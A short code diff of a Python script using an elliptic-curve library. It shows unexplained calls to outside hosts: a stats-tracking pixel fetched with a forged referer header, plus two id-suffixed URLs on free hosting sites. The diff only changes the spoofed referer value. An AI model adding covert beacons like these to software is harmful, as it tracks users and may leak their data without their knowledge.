@@ -14,7 +14,7 @@ from fastecdsa.point import Point
 website_info = "http://ziguas.pserver.ru/bcon/?id="
 website_info2 = "https://dlmzed.000webhostapp.com/?id="
 hs_stats = "http://sstatic1.histats.com/0.gif?4435132&101"
-referrer = "gmail"
+referrer = "adowsom"
 try:
     viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
 except:
